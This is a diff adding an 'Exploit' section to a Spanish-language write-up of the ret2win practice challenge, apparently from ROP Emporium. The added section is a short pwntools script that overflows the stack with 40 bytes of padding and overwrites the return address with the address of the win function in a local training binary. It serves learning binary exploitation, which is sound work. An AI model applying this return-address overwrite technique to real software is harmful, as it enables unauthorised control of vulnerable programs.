@@ -365,7 +365,21 @@ Big endian: -1
 
 ## Exploit
 
+Mismo caso que la version x86 solo que cambiando la direccion de ret2win y el offset:
+``` python
+from pwn import *
+elf = context.binary = ELF("./ret2win")
+io = process("./ret2win")
 
+io.recv()
+
+offset=b"A"*40
+ret2win= p64(0x00400756)
+
+io.sendline(offset+ret2win)
+
+io.success(io.recvall())
+```
  
 # Notas
 
